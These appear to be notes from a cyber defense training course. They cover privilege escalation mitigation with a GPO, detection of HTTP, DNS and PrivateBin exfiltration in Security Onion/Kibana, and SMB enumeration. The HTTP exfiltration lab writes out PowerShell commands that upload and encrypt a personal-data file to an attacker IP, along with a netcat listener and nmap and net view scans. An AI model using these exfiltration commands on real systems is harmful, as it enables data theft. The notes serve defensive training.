Username: trainee
Password: CyberTraining1!



6. Open the PowerShell shortcut on the desktop with administrator privileges.


7. Enter the following command to create a new GPO related to the setting that is being enforced:
PS C:\windows\system32> New-GPO -Name "AlwaysInstallElevatedPolicy" -Comment "Enforces AlwaysInstallElevated policy to be disabled."



8. Enter the following commands to set the registry value of the settings that are being enforced:
PS C:\windows\system32> Set-GPRegistryValue -Name "AlwaysInstallElevatedPolicy" -Key "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" -ValueName AlwaysInstallElevated -Type String -Value "0"

PS C:\windows\system32> Set-GPRegistryValue -Name "AlwaysInstallElevatedPolicy" -Key "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" -ValueName AlwaysInstallElevated -Type String -Value "0" 



9. Enter the following command to link the new GPO to the domain:
PS C:\windows\system32> New-GPLink -Name "AlwaysInstallElevatedPolicy" -Target "ou=Systems,dc=vcch,dc=lan"

------------------------------------

Challenge: Detecting Windows Privilege Escalation
Use all of the mitigation and detection techniques in this lesson to detect the technique used to gain privilege escalation on the target.

﻿

Scenario
﻿

In this mission partner’s environment, the CPT all-source intelligence cell has received reporting indicating that an Advanced Persistent Threat (APT) known to use Windows privilege escalation techniques has infiltrated the environment and is attempting to gain higher privileges to further attack the infrastructure. A City Hall Parks employee (tjonathan) reported that Google Chrome will not open on their machine ch-parks-1. They reported the incident on January 13, 2022, at 1530. Use the absolute dates January 12, 2022 0900 to January 14, 2022 0900 for this investigation. 

﻿

Recall the following Sysmon Event IDs that may be of assistance during the investigation:

1: ProcessCreate

3: NetworkConnection

11: FileCreate

15: FileCreateStreamHash


Recall the following Kibana fieldnames that may be of assistance during the investigation:

source.ip - Used to search for any results using a specific source IP address.

destination.ip - Used to search for any results using a specific destination IP address. 

event.code - Used to search through logs using a specific Sysmon Event Id. 

agent.hostname - Used to search for any logs with a specific hostname.

Recall the following Kibana syntax when using Security Onion:

fieldName: value AND fieldName: value

fieldName: value AND NOT fieldName: value

fieldName: value OR fieldName: value

fieldName: (value OR value OR value)

Using Elastic in Security Onion, investigate the ch-parks-1 (172.35.5.2) machine, and determine the technique(s) used to escalate privileges. 

﻿

1. Log in to the VM win-hunt and VM ch-parks-1 machines using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. In the VM win-hunt, open Google Chrome.

﻿

3. Select the bookmark Discover - Elastic.

﻿

4. Log in to Security Onion with the following credentials:

Username: trainee@jdmss.lan
Password: CyberTraining1!
﻿
![image](https://github.com/user-attachments/assets/b936b0ea-4325-40ff-9930-08495a77d3b7)

chrome.dll

![image](https://github.com/user-attachments/assets/a26bec8a-51cb-4f3c-a7e8-97bc4dd2a3b1)



![image](https://github.com/user-attachments/assets/5854ddf7-8b4d-4071-88ed-356d7c146dfa)

![image](https://github.com/user-attachments/assets/3c68adb6-08b7-435a-bffd-592d99c1510f)



![image](https://github.com/user-attachments/assets/002e48b3-2034-400c-8a2c-0dab8b714738)


-------------------------------

#### CDAH-M10L1-Exfiltration Methods and Protocols ####

Data Exfiltration over HTTP
Examination of PowerShell Data Exfiltration over HTTP
﻿

Before the actual data exfiltration takes place, attackers may compress, encrypt, or encode the payload that is about to be sent to the attackers’ server. Attackers usually do this either with the backdoor or a third-party tool. This allows attackers to minimize the size of the data they are exfiltrating and obfuscate its contents to bypass network monitoring.

﻿

The next activity provides an example of data exfiltration using PowerShell. In it, an attacker reads the contents of a file from the local system, encrypts it with a variation of Advanced Encryption Standard (AES), and sends it to the attacker’s server through HTTP over port 80. In most cases, this approach does not raise any alarms, so attackers can use it to perform stealth exfiltration.

﻿

﻿

Exfiltrate Data over HTTP
﻿

Use built-in PowerShell commands and Kali tools to demonstrate how an attacker may exfiltrate a file using HTTP POST requests.

﻿

Workflow
﻿

1. Log in to the Virtual Machine (VM) red-kali with the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open a Netcat listener in a new terminal window:

(trainee@red-kali)-[~] $ nc -lvnp 5555
﻿

3. In another new terminal window, change directories to the lab folder on the desktop:

(trainee@red-kali)-[~] $ cd Desktop/lab
﻿

4. Open a web service to receive data by running the following command:

(trainee@red-kali)-[~/Desktop/lab] $ sudo ./webservice.py
[sudo] password for trainee: CyberTraining1!
﻿

5. Log in to the VM ch-edu-1 as Karen Smith with the following credentials:

Username: ksmith
Password: CyberTraining1!
﻿

6. Execute the WindowsUpdate.exe executable from the desktop. This is a staged malicious binary downloaded to the desktop by the user.




7. In the netcat listener terminal on red-kali, open a PowerShell session by entering the following command:

C:\Users\ksmith\Desktop>powershell
﻿

Below, Figure 10.1-1 illustrates the results from entering this command:

﻿
![image](https://github.com/user-attachments/assets/6ccd4141-69df-48d0-b57d-8798f2509b72)


8. Change directories to the user’s Documents folder at C:\Users\ksmith\Documents, and enter the dir command to list the files in the directory.


There are a number of documents in this folder that an attacker may find interesting, including a security policy memorandum, a system access request, and personal information about other employees. Figure 10.1-2, below, displays this list of documents:


![image](https://github.com/user-attachments/assets/7218eb5b-a1c0-4b81-9468-47b0e8a89b1d)

9. Upload the City Educators Address Book.pdf document through HTTP POST to the web server on Kali with the following command:
PS C:\Users\ksmith\Documents> Invoke-RestMethod -Uri http://128.0.7.205/upload.php -Method Post -Infile 'C:\Users\ksmith\Documents\City Educators Address Book.pdf'



Step 9 highlights one way to exfiltrate interesting files over the HTTP protocol on port 80 of the attacker machine. However, an attacker may be more interested in preventing a defender from seeing the file upload in this apparent way. Complete the rest of this lab to employ encryption that obscures the data being sent.


10. Stop the web service the keyboard command CTRL + c.


11. Start a netcat listener on the standard HTTP port to send received data to a file by entering the following:
(trainee@red-kali)-[~/Desktop/lab] $ sudo nc -lnp 80 > data



NOTE: If step 11 prompts for a password, use CyberTraining1!


In this lab, step 11 sends the encrypted data over port 80. Another common data exfiltration method is to send the data over port 443, since it mimics normal, encrypted HTTPS traffic.


12. Change directories to the user’s Desktop folder at C:\Users\ksmith\Desktop.


13. Create an encrypted file upload through HTTP POST messages by entering the following series of six commands in the PowerShell session:
PS C:\Users\ksmith\Desktop>$file = Get-Content 'C:\Users\ksmith\Documents\City Educators Address Book.pdf'



PS C:\Users\ksmith\Desktop>$key = (New-Object System.Text.ASCIIEncoding).GetBytes("54b8617eca0e54c7d3c8e6732c6b687a")



PS C:\Users\ksmith\Desktop>$secureString = new-object System.Security.SecureString



PS C:\Users\ksmith\Desktop>foreach ($char in $file.toCharArray()) { $secureString.AppendChar($char) }



PS C:\Users\ksmith\Desktop>$encryptedData = ConvertFrom-SecureString     -SecureString $secureString -Key $key



PS C:\Users\ksmith\Desktop>Invoke-WebRequest -Uri http://128.0.7.205 -Method POST -Body $encryptedData



14. Close the netcat process with the following keyboard interrupt. This action saves the entire encrypted payload to the data file.
^C

![image](https://github.com/user-attachments/assets/739ac11d-85d9-4987-9823-c928d204cdf8)


-----------------------------------------------------

Data Exfiltration Detection
Detecting Data Exfiltration using Elastic Stack
﻿

Zeek logs and Suricata rules are a powerful mechanism for detecting data exfiltration when a compromise is expected in a network. Defenders must place sensors appropriately for Zeek and Suricata to effectively collect the metadata for all traffic across a network.

﻿

Use Elastic Stack to Detect Data Exfiltration
﻿

An analyst can find evidence of the data exfiltration performed over HTTP, and related metrics, by using the Zeek logs, Suricata alerts, and the Kibana front end to the Elastic Stack. The following activity makes these tools available in its installation of Security Onion.

﻿

Workflow
﻿

1. Log in to the VM win-hunt with the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open the Kibana Discover - Elastic view from the bookmark in the Chrome browser and log in with the following credentials:

Username: trainee@jdmss.lan
Password: CyberTraining1!
﻿

3. In a new tab, open the Security Onion dashboard Zeek - Files using the Chrome bookmark.

﻿

This dashboard can be used to find network-based file operations across the enterprise when an attacker does not apply any obfuscation to the file upload or download.

﻿

4. Modify the query in the Kibana Discovery query field at the top of the page to include the address below as an Indicator of Compromise (IOC) to the team:

event.dataset:file* and destination.ip: 128.0.7.205
﻿

Figure 10.1-3 illustrates this step:

﻿![image](https://github.com/user-attachments/assets/fc715ca3-881d-46c0-ba7e-6b381c096335)




The event.dataset filter may be used for other sets of interest for finding evidence of data extraction, such as http, https, dns, smtp, or others mentioned in the introduction. This IP address is of interest as an IOC due to the activities associated with the netcat listener in the previous exercise.


5. Set the date range to the absolute range 16 February 2022 15:00:00 - 16 February 2022 16:00:00 in the timespan field, next to the calendar icon.


6. Open the earliest record listed with the destination IP address 128.0.7.205


This record includes the following fields of helpful information: 
file.bytes.total: Size
@timestamp: Time
destination.ip: Destination IP address
client.ip: Source IP address
file.source: Protocol over which the file was sent or received
hash.md5: MD5 hash
file.mime_type: File type
file.extracted.filename: Location of the file on the SIEM

In an investigation, these details are helpful in determining if this upload is part of a coordinated attack. If this file proves to be of interest in the investigation, an extracted copy of that file is available on the SIEM server at the listed location.


Figure 10.1-4, below, highlights the Log ID field. Filtering logs stored in Elastic Stack by this Zeek Log ID returns both this file action log entry, as well as the connection logs of the associated upload.


![image](https://github.com/user-attachments/assets/52521759-dcf8-403f-bb5c-0871361c0d21)


7. To view other associated logs, select the link in the log.id.uid field and update the date/time picker with 16 February 2022 15:00:00 - 16 February 2022 16:00:00 (the same time range as in step 5).


Figure 10.1-5, below, shows the file uploaded on the Kibana Discover web interface. Based on the scenario and previous workflow, there are still logs that need to be analyzed from the PowerShell-encrypted upload. Defenders can find these events by applying filters to the Kibana Discover dashboard, as in step 9, below.


![image](https://github.com/user-attachments/assets/b9866148-45f8-4a01-b486-ab8cec852b87)


8. Go to the Security Onion HTTP Dashboard using the Chrome bookmark for Zeek - HTTP.


9. Enter the following query to isolate the other logs:

event.dataset:http and http.method.keyword:POST



A new URI is listed in the URI section of the HTTP Dashboard. It is different from the upload.php page, where the attacker uploaded the file in plaintext.


10. Add the base address as a filter by selecting the Add Filter button in the URI section, as highlighted in Figure 10.1-6, below:

![image](https://github.com/user-attachments/assets/ba847823-5237-40ab-a37c-083cc8f5d1ae)



In this case, since the netcat listener is not a functioning HTTP server, the response code is absent entirely during the data transfer, as highlighted in Figure 10.1-7, below.

![image](https://github.com/user-attachments/assets/fa87e8e6-650e-4207-bc7f-4f883dfa2017)

Defenders can also use Sysmon logs to discover this file action on a properly configured host. 


Additionally, Zeek includes HTTP response codes in the field http.status_code. This information can be used to analyze the outcome of HTTP requests and responses to identify anomalies or suspicious activities during the data transfer process.


11. Open the Security Onion - Sysmon dashboard from the Dashboard library in Kibana.


12. Update the date/time picker with 16 February 2022 15:00:00 - 16 February 2022 16:00:00 (the same time range as in step 5).


13. Add the following query, as displayed in Figure 10.1-8:
event.module:sysmon and event.dataset.keyword:"network_connection" and destination.port:80

![image](https://github.com/user-attachments/assets/5b87a480-be43-443b-b922-3a7708e0016e)

This is a host-based way of finding HTTP actions, but using Sysmon logging instead of Zeek. Sysmon lacks the greater fidelity of information that Zeek offers through data such as specific headers and packet contents. However, a helpful crossover is available through the **Network Community ID field. Selecting this link in this field, as highlighted in Figure 10.1-9, below, shows all logs related to the entire network session. This includes logs from both Sysmon and Zeek.**

![image](https://github.com/user-attachments/assets/8287a7e2-c6e9-4054-a1c9-d92c6a05d2bc)

![image](https://github.com/user-attachments/assets/7d044e8f-a3b5-43ea-bc3f-9c2fc3728258)
![image](https://github.com/user-attachments/assets/f30f089f-fff5-464e-835d-2426221dac5d)
![image](https://github.com/user-attachments/assets/576c8e32-24db-472f-b8c4-5006f7bcf6d7)
![image](https://github.com/user-attachments/assets/dfd9814e-731f-4bc8-9d16-74e714750657)
![image](https://github.com/user-attachments/assets/36a47e91-efcd-4798-a59d-c6bff01c3e4f)


---------------------------------------------------

#### CDAH-M10L2-SMB Enumeration and Lateral Movement ####


SMB Enumeration Techniques
The CPT has been assigned to a mission to audit SMB shares. A domain account has been provided to the CPT to assist local defenders. Enumerate the SMB shares, and identify misconfigurations that an adversary may be able to take advantage of.

﻿

Workflow﻿

﻿

1. Log in to the ch-tech-1 Virtual Machine (VM) using the following credentials:

Username: trainee
Password: CyberTraining1!
 

2. Open a command prompt, and run the following command to enumerate the SMB shares on the Domain Controller (DC) ch-dc1: 

C:\Users\trainee>net view \\ch-dc1 /ALL
﻿
![image](https://github.com/user-attachments/assets/cc6e921c-816a-40ff-957f-cab592184f16)

3. The DC’s admin shares are enabled. Such malware as Emotet and Trickbot (botnets that exploit SMB as part of their attack chain) specifically hunt for these admin shares to attempt to exploit them for lateral movement. The NETLOGON server share is used for domain logins, which means port 445 is not blocked on this host, and SMB shares are listening for any admin connection. 


Enter the following command to enumerate all the hosts with the admin share enabled. This command only queries hosts on a per-subnet basis, so only hosts in the same subnet as ch-tech-1 respond.
C:\Users\trainee>net view /domain:VCCH /ALL

![image](https://github.com/user-attachments/assets/beb7d336-69b9-4806-bca3-d302d7f7426f)

If an attacker gained a foothold on this user machine, they could see that two other workstations are open for potential exploitation or lateral movement. If an attacker has already gained administrator credentials through other means or uses a pass-the-hash attack, they can also laterally move to those other two hosts.


![image](https://github.com/user-attachments/assets/cab066c7-fb83-4026-b2a9-6e615e4e28b6)

-----------------------

SMB Enumeration: Third-Party Tools
Adversaries use built-in OS commands when hunting for targets for lateral movement. However, for more efficient attacks, more advanced capabilities provided by custom or third-party tools are often necessary.

﻿

This section focuses on the third-party tool Nmap for performing SMB enumeration.

﻿

Nmap Overview
﻿

Nmap includes several options for enumerating SMB information on hosts. Nmap has some simple SMB tests and more in-depth SMB enumeration scripts, discussed later in this lesson.

﻿

The Nmap command to check whether a given host has the SMB ports open is as follows:

nmap -p 139,445 [HOST.IP.ADDRESS.X]
﻿

These specific flags in the command are looking for the port status of 139 and 445 because those ports are the default listening ports for SMB.

﻿

In addition, Classless Inter-Domain Routing (CIDR) notation may be used to scan a range of Internet Protocol (IP) addresses to target a specific subnet. Running Nmap with a full CIDR range may take a few minutes (or hours for large scans) but is more thorough and can be useful for threat hunting. For example, in this exercise, the following command returns all the hosts that have ports 139 and 445 open:

nmap -p 139,445 172.35.0.0/16

![image](https://github.com/user-attachments/assets/de85cc69-6cf2-4291-aa2b-db523544df71)

Many other third-party tools integrate Nmap into their network scanning, so checking for Nmap scans is a good way to find an attacker probing an environment. 

![image](https://github.com/user-attachments/assets/10457af0-ac5e-45a7-b102-d8f9b8b56c2e)


-----------------------


Workflow


1. Log in to the kali-hunt VM using the following credentials:

Username: trainee
Password: CyberTraining1!



2. From the kali-hunt desktop, analyze the three scan results and answer the following questions.
/home/trainee/Desktop/scan-scripts.txt
/home/trainee/Desktop/nbtscan_172.35.2-4.txt
/home/trainee/Desktop/nbtscan_172.35.2.0.txt

![image](https://github.com/user-attachments/assets/46bbfe2c-bd73-42b8-92f9-aa9c1854178b)

![image](https://github.com/user-attachments/assets/14d86f76-471e-4713-9e5b-de98de23eaf7)

![image](https://github.com/user-attachments/assets/fde7bd81-2723-43d2-9e3e-e2e81e8bd01a)

![image](https://github.com/user-attachments/assets/db914297-1cd1-4fb2-a199-627917071efc)

![image](https://github.com/user-attachments/assets/b2677db1-b75d-478a-a751-ef1b6e0b9e2e)

![image](https://github.com/user-attachments/assets/bf240c49-8523-4399-83ad-254ab6c694fa)

![image](https://github.com/user-attachments/assets/971bb08a-f42e-409e-af84-710adc229872)

![image](https://github.com/user-attachments/assets/ef3e72d8-84c4-4001-acb3-60ab89d8ab48)


--------------------------

Lateral Movement Detection
The CPT has been tasked to investigate suspicious traffic on the VCCH network. A suspected threat actor may have used SMB shares to distribute files throughout a network for lateral movement. Local defenders noticed suspicious traffic on their network on Monday, February 14, 2022 between 00:00 and 06:00. The user account merlin.sweeney reported unspecified unusual activity on their workstation. In addition, a new, unidentified host briefly appeared in the logs prior to the suspected compromise. The rogue device’s IP address was 172.35.11.6. A domain account has been provided to the CPT for this exercise in order to investigate hosts within the network from the DC ch-dc1.


﻿

Workflow﻿

﻿

1. Log in to the win-hunt VM using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Select the Discover - Elastic bookmark in Chrome, and log in using the following credentials:

Username: trainee@jdmss.lan
Password: CyberTraining1!
﻿

3. Perform an investigation in the network using the time period Feb 14, 2022 @ 00:00:00.000 – Feb 14, 2022 @ 06:00:00.000 for SMB enumeration or activity from the merlin.sweeney user account.

﻿

4. Use Elastic and the following domain credentials to identify any Indicators of Compromise (IOC) associated with the merlin.sweeney account in the VCCH network:

Username: trainee
Password: CyberTraining1!
﻿
![image](https://github.com/user-attachments/assets/5c09063d-02d4-4eca-8f70-19599a3003f1)

![image](https://github.com/user-attachments/assets/f25f5020-bc3a-432c-a89a-58c67c0cebea)

![image](https://github.com/user-attachments/assets/10ebce61-a092-4736-844f-6c94e1ea5683)

![image](https://github.com/user-attachments/assets/b380fc7b-91f2-4577-8de4-299560391c5c)

![image](https://github.com/user-attachments/assets/1088049d-ec58-4836-9a43-e35b02a6efae)

![image](https://github.com/user-attachments/assets/c8646e45-0896-46d5-852b-d8600b5d6c2b)


------------------

#### CDAH-M10L3-Data Exfiltration through Allowlisted Cloud Services ####

Hunt for DNS Exfiltration
Complete the following walkthrough for developing hunting strategies and visualizations using Elastic Stack, through Kibana. The visualizations help identify DNS traffic occurring on the network. Through the implementation of hunting strategies potentially malicious DNS traffic to an allowlisted cloud service will be detected. 

﻿

Workflow
﻿

1. Log in to the VM win-hunt using the following credentials:

Username: trainee
Password: CyberTraining1! 
﻿

2. Open Google Chrome.

﻿

3. Select the bookmark for Visualize - Elastic to open the Visualize Library. 

﻿

4. Open Security Onion using the following credentials:

Username: trainee@jdmss.lan
Password: CyberTraining1!
﻿

5. Select Create visualization, located on the top right of the page. 

﻿

6. Within the New visualization window, select Aggregation based, then select Data table.

﻿

7. Within the New Data table / Choose a source window, select *:so-*﻿

﻿

8. Set the time span to the following one-hour time frame:

January 28, 2022 @ 10:00:00.000 → January 28, 2022 @ 11:00:00.000
﻿

9. Add a bucket using split rows with the following information:

Aggregation: Terms

Field: dns.question.registered_domain.keyword

Metric: Count

Order: Descending 

Size: 100

Figure 10.3-2, below, displays the resulting data table. The field dns.question.registered_domain.keyword displays all domains that were reached throughout the VCCH network.

![image](https://github.com/user-attachments/assets/6b3fa579-6631-461f-a5ad-e0079707d38f)

10. Add a filter to the data table to only display data from the VM ch-tech-1, as shown in Figure 10.3-3, below:

![image](https://github.com/user-attachments/assets/32a75a4a-3518-444a-b979-058c96820102)

Figure `0.3-4, below, displays the resulting data table. The VCCH network uses a cloud infrastructure with Google and Microsoft. Both services are allowlisted, making them easy vehicles for data exfiltration. The table indicates that the google.com domain has been reached 892 times in the 60-minute time span.

![image](https://github.com/user-attachments/assets/4b68142a-b344-4bb7-9f10-8cbef11e7a2a)

11. In a new tab, select the Discover - Elastic bookmark. 


12. Set the time span to the same one-hour time frame, as in step 8: 
January 28, 2022 @ 10:00:00.000 → January 28, 2022 @ 11:00:00.000



13. In the Search Bar enter the following query:
event.dataset:dns



The query filters and displays DNS traffic exclusively as the data exfiltration occurs over DNS. This enables focusing on DNS traffic on the Discover page.


14. Add a filter to only show logs collected on the VM ch-tech-1, as shown in Figure 10.3-5, below:

![image](https://github.com/user-attachments/assets/93213b41-1fc9-4b94-9e1f-1cd8506c4c3b)

Figure 10.3-6, below, displays the Discover page after implementing the filter from step 14. The resulting graph indicates an apparent uptick in DNS traffic. This is a clear sign of data exfiltration. An uptick indicates a large spike in the number of DNS messages. The DNS messages could be to one domain or numerous different domains. Any upticks in traffic need to be analyzed and reviewed to identify whether the activity is suspicious or intentional.

![image](https://github.com/user-attachments/assets/9ff4e35e-f6f1-4bef-90e7-80ffcf9c01f7)



15. Modify the query in the search bar to include the following information:

event.dataset: dns AND dns.question.registered_domain: google.com



Google.com is a known allowlisted cloud service. Analysts must determine if the uptick in DNS traffic is attributed to this cloud service. Figure 10.3-7, below, displays the results of this query. This verifies that the uptick in DNS traffic is in requests and communications sent to google.com, which must be investigated further. 

![image](https://github.com/user-attachments/assets/58079620-3bce-41b0-84eb-920e73760bd2)



16. Return to the Visualize Library - Elastic tab, containing the newly created data table.


17. Add the following filter to remove any of the dns.highest_registered_domain that end with vcch.lan:
agent.hostname: ch-tech-1 and NOT dns.question.registered_domain: *vcch.lan



This allows queries to ignore unrelated DNS logs as a workaround for the inconsistencies present in the DNS server. See Figure 10.3-8.

![image](https://github.com/user-attachments/assets/31d813ca-a8f1-454f-96b6-bd55ac3ff8ab)

18. Modify the existing bucket and update the data table to contain the following information:
Aggregation: Terms
Field: dns.question.name.keyword
Metric: Count
Order: Descending 
Size: 100

The dns.question.name field contains all of the domain information with the request, including the subdomain, as Figure 10.3-9 indicates, below:

![image](https://github.com/user-attachments/assets/b3194aaf-28af-4994-b806-06cf187b34b1)

Navigate to page 3 of the data table. Figure 10.3-10 displays this page, which reveals a large amount of alphanumeric text prior to the subdomain for connections made to google.com. The text indicates suspicious activity by which the subdomain is sending hexadecimal data through the DNS traffic. 

![image](https://github.com/user-attachments/assets/b316913b-b772-4616-9309-5b8f1ca03c3a)

As  explained  earlier in this lesson, a DNS request for 68656c6c6f776f726c64.34.google.com contains a hex-encoded ASCII string in the subdomain in the request. Attackers will convert back this large string of characters to plain ASCII to make the data legible. This prevents local defend ers from e asily identifying the data that has been stolen. However, the defenders can use a SIEM to identify the large amount of characters in the subdomain as suspicious activity. The defenders need to investigate the activity further, to discover what data was stolen, how the machine was compromised, and if the a dversary s till maintains a presence on the host. 



--------------------

Hunt with Lens Visualizations
Complete the following walkthrough to develop lens visualizations that aid in hunting and detection for exfiltration. Lens is an intuitive, "drag-and-drop" tool that allows users to easily create and manipulate visualizations to display data for faster analysis.  

﻿

Workflow
﻿

1. Log in to the VM win-hunt using the following credentials:

Username: trainee
Password: CyberTraining1! 
﻿

2. Open Google Chrome.

﻿

3. Select the bookmark for Discover - Elastic. 

﻿

4. Open Security Onion using the following credentials:

Username: trainee@jdmss.lan
Password: CyberTraining1!
﻿

5. Within the Discover page, set the time span to the following one-hour time frame:

January 26, 2022 @ 11:00:00.000 → January 26, 2022 @ 12:00:00.000
﻿

6. Show DNS requests on the Discover page by entering the following query that uses the wildcard operator (*) to return all DNS requests from across the network: 

dns.question.registered_domain.keyword: *
﻿

7. Add the following filter to the query to remove all data pertaining to live.com, vcch.lan, and microsoft.com, as shown in Figure 10.3-11, below:

NOT dns.question.registered_domain.keyword is one of vcch.lan, live.com, microsoft.com

![image](https://github.com/user-attachments/assets/89e0d428-ab87-4892-bc7b-22a04f74089c)


NOTE: Due to inconsistencies in how data is handled in the network, these sites must be removed for this lab.


Figure 10.3-12, below, displays the resulting data. The chart displays an increase in DNS requests starting after 11:40:00.000 and ending prior to 11:45:00.000. Analysts must review this further to assess if there is potential Malicious Cyberspace Activity (MCA). 


![image](https://github.com/user-attachments/assets/74dab8ce-c710-494e-924f-bd77a81d378f)

8. In a new tab, select the bookmark Visualize - Elastic.


9. Select Create visualization.


10. Within the New visualization window, select Lens. 
Figure 10.3-13 displays the screen that appears: 

![image](https://github.com/user-attachments/assets/b9207805-b8cd-48af-8e3c-19d20c6c94b1)

NOTE: Kibana Lens is an intuitive, “drag-and-drop” user interface (UI) that simplifies data visualization within Elastic Stack. While this lab provides a brief introduction, upcoming lessons in this course provide an in-depth view of Kibana Lens. 


11. Set the time span to the following five-minute time frame for a closer view of the increase in the DNS requests:
January 26, 2022 @ 11:40:00.000 → January 26, 2022 @ 11:45:00.000



12. Drag and drop the dns.question_registered_domain.keyword to the pane labeled Drop some fields here to start location, as Figure 10.3-14 displays, below: 

![image](https://github.com/user-attachments/assets/e777a2ab-d67d-4c14-9559-555e84d8a50c)

13. Add the same filter from step 7 to remove all data pertaining to live.com, vcch.lan, and microsoft.com, as displayed in Figure 10.3-15, below:

![image](https://github.com/user-attachments/assets/77dc0267-fd9c-4401-9d15-fa55609386ba)

14. On the right pane, under Horizontal Axis, select Top values of dns.question.registered_domain.keyword.


15. In the Number of values input box, select 100, so that the vertical bar chart matches Figure 10.3-16, below:


![image](https://github.com/user-attachments/assets/3609b199-4cfa-41d5-8f13-050651c68806)


The setup in Figure 10.3-16 reveals that the top DNS requests within the timeframe of the increase is privatebin.com. Additionally, privatebin.info also appears further down on the chart. PrivateBin is an online, open source pastebin that claims to use a server that has zero knowledge of the data saved in it. PrivateBin states that their data is, “encrypted and decrypted in the browser.” PrivateBin offers no security or coverage from items in the pasted data, which makes it a preferred choice among adversaries attempting to exfiltrate data out of a compromised host. DNS requests to privatebin.com are not by themselves necessarily malicious. However, the large quantity of requests in comparison with the other domains seems out of place, especially compared to google.com. This requires further investigation.


16. Open the Discover page in a separate tab and set the time span to the following one-hour time frame:
January 26, 2022 @ 11:00:00.000 → January 26, 2022 @ 12:00:00.000



17. Modify the current query to filter all data by privatebin.com or privatebin.info, using the following syntax:
dns.question.registered_domain.keyword: privatebin.com OR privatebin.info



Figure 10.3-17, below, displays the results of this step:

![image](https://github.com/user-attachments/assets/30f02b96-2029-44fe-88b5-7b98f2251ccf)

The query results that include PrivateBin in Figure 10.3-17 reveal a clear overlap of the increase in DNS traffic identified from step 7 of this lab. Figure 10.3-18, below is a snapshot of the chart from step 7. This chart highlights the increase, which starts at 11:40:00.000 and ends prior to 11:45:00.000.  

![image](https://github.com/user-attachments/assets/5a7b215c-bf30-4723-8e99-2b205d2eb768)

The updated query displayed in Figure 10.3-19, below, highlights additional traffic to PrivateBin between 11:45:00.000 and 11:50:00.000. While an increase can be quickly identified using a chart or visualization, activity may still be occurring without showing an increase, as it may blend in with normal network activity.  

![image](https://github.com/user-attachments/assets/a25056eb-8d50-4e83-824b-5c06442dedac)


----------------------------------

Exfiltration Through Cloud Services
This workflow identifies and illustrates data exfiltration to the cloud service PrivateBin. In this scenario, the data being exfiltrated uses PrivateBin's HTTP interface to upload the data. The attacker retrieves the uploaded data using an alternate communications path. Investigate any HTTP traffic to PrivateBin.

﻿

Workflow
﻿

1. In the VM win-hunt, navigate to the bookmark Visualize - Elastic. 

﻿

2. Create a new Lens data table visualization using the following fields to display an overview of HTTP traffic for the time period Feb 1, 2022 @ 00:00.000 - Feb 14, 2022 @ 23:30:00.00:

source.ip

server.domain.keyword

http.request.method.keyword

﻿

Below, Figure 10.3-20 displays the resulting table. There is very little traffic for this two-week period and all traffic is going to two domains: privatebin.com and pastebin.com. 

﻿![image](https://github.com/user-attachments/assets/2cab1cce-3d30-4f00-b96a-6183d8cd50cc)

3. In a new tab, use Discover filters to analyze the HTTP GET traffic to privatebin.com:
server.domain: privatebin.com
http.request.method: get



4. Review the following fields to analyze the events:
client.ip
server.domain
server.ip
http.request.method
url.full
user_agent.original
http. request.head ers.content-type

![image](https://github.com/user-attachments/assets/4109e23b-5616-415a-b47f-fd1c632a89fc)

![image](https://github.com/user-attachments/assets/b0907297-24bc-40c4-868f-9fe97cbf296e)

----------------------

PrivateBin Exfiltration
Follow the workflow, below, to continue investigating privatebin.com from step 2 of the previous workflow. This time, focus on HTTP POST traffic.

﻿

Workflow
﻿

1. Navigate to the Visualize-Elastic page in the VM win-hunt. 

﻿

2. Change the filter http.request.method to show the POST traffic:

http.request.method: post﻿

﻿

3. Analyze the associated results.

﻿

Use the information from this exercise to answer the n ext Knowledge  Check.

![image](https://github.com/user-attachments/assets/b6bdb9d9-ec6b-4483-a114-21bac6144d66)

![image](https://github.com/user-attachments/assets/e1a1ffc8-751a-4ce4-9a80-b28235c8f5ef)

-----------------------

Investigate DNS Exfiltration in VCCH
Scenario 
﻿

A Cyber Protection Team (CPT) has been assigned a mission within the VCCH network. The primary object of the mission is to execute a hunt operation for MCA. Perform an individual hunt for exfiltration as part of the hunt operation. The VCCH network uses a variety of cloud infrastructures to help perform daily tasks, below is the allowlist of cloud services:

Apple 
Google
Microsoft/Azure
All queries in the scenario should be run against the *:so-* index, with the timeframe set to January 28, 2022 @ 11:00:00.000 – January 28, 2022 @ 12:30:00.000.

﻿

Workflow
﻿

1. Log in to the VM win-hunt using the following credentials:

Username: trainee
Password: CyberTraining1! 

﻿

2. Open Google Chrome.

﻿

3. Select the bookmark Discover - Elastic. 

﻿

4. Open Security Onion using the following credentials:

Username: trainee@jdmss.lan
Password: CyberTraining1!
﻿

5. Use Kibana to aid in the investigation while answering the upcoming series of Knowledge Checks.

![image](https://github.com/user-attachments/assets/65eafd8f-211a-4fe0-a3d8-9b61b997e95b)

![image](https://github.com/user-attachments/assets/6132f6d8-848a-4968-8577-254e90e0d474)

![image](https://github.com/user-attachments/assets/c8d4aedf-9401-4287-b6bd-18be721d7636)

![image](https://github.com/user-attachments/assets/398303b2-12f2-4c67-b4c6-1f47c875727e)

![image](https://github.com/user-attachments/assets/e5516229-1fbe-4e22-9a89-bf0583a5083f)

---------------------

Spikes in DNS Traffic
The graph populated on the Discover page reveals two spikes in DNS traffic that occurred over the timespan identified in the last question. Figure 10.3-22 highlights these spikes, below. The first spike occurs at 11:47, with more than 3,500 logs collected. The second, smaller spike occurs at 12:00, with around 1,100 logs collected. 

![image](https://github.com/user-attachments/assets/284a7403-ca5e-49a5-9312-9df3794614c7)

---------------------------

click on spinl and filter for hostname

![image](https://github.com/user-attachments/assets/960f46de-e198-467a-b588-e0525609ef01)

![image](https://github.com/user-attachments/assets/3a02e490-b731-4d17-93b8-58824227ab3b)

------------------

DNS Traffic by Host
There are many paths to identify which host experienced the spike in DNS traffic. For example, by using the Discover graph and table to find the host, as displayed in Figure 10.3-23, below:

﻿
![image](https://github.com/user-attachments/assets/612f8e6e-7611-44b3-8e60-8dabbe45e7e1)

Figure 10.3-24, below, shows how selecting the first spike in DNS traffic causes the graph’s x-axis to change from five-minute increments to five-second increments:

![image](https://github.com/user-attachments/assets/af120049-32ee-4d96-88f3-7ae8827d077a)


Selecting the entirety of the spike, from 11:47:00.000 to 11:48.00.000, and adding the field agent.hostname to a column easily identifies which host experienced the spike. Figure 10.3-25, below, displays this information:

